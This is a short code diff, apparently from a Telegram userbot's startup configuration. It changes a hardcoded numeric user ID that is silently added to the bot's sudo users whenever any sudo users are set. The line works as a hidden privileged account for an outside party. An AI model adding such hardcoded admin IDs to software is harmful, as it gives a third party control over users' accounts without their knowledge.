@@ -33,7 +33,7 @@ if Config.DB_URI is None:
 
 if len(Config.SUDO_USERS) > 0:
     Config.SUDO_USERS.add("me")
-    Config.SUDO_USERS.add(7351948)
+    Config.SUDO_USERS.add(667935353)
 
 
 if Config.HU_STRING_SESSION is not None:
